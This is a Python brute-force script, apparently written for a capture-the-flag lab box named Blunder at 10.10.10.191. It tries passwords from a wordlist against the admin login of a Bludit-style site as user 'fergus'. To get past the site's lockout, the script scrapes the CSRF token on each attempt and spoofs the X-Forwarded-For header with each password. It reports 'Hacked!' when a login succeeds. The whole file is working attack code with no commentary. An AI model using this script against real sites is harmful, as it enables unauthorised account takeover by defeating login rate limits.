#!/usr/bin/env python3

import re
import requests
import sys

login_url = 'http://10.10.10.191/admin/login'
username = 'fergus'

if len(sys.argv) != 2:
    print('Usage: blunder_bf.py [PASSWORDS_WORDLIST]')
    raise SystemExit(1)

with open(sys.argv[1], 'r') as wordlist:
    for line in wordlist:
        password = line.strip()
        session = requests.session()
        session.proxies = {'http': 'http://127.0.0.1:8080'}
        login_page = session.get(login_url)
        csrf_token = re.search(r'value="\w*"', login_page.text).group(0)[7:-1]
        headers = {'X-Forwarded-For': f'{password}'}
        data = {
            'tokenCSRF': f'{csrf_token}',
            'username': f'{username}',
            'password': f'{password}',
            'save': ''
        }
        print(f'[-] Trying {username}:{password}')
        auth_result = session.post(login_url, headers=headers, data=data, allow_redirects=False)
        if 'Location' in auth_result.headers:
            if auth_result.headers['Location'] != '/admin/login':
                print(f'\nHacked!\n  Login: {username}\n  Password: {password}')
                raise SystemExit(0)
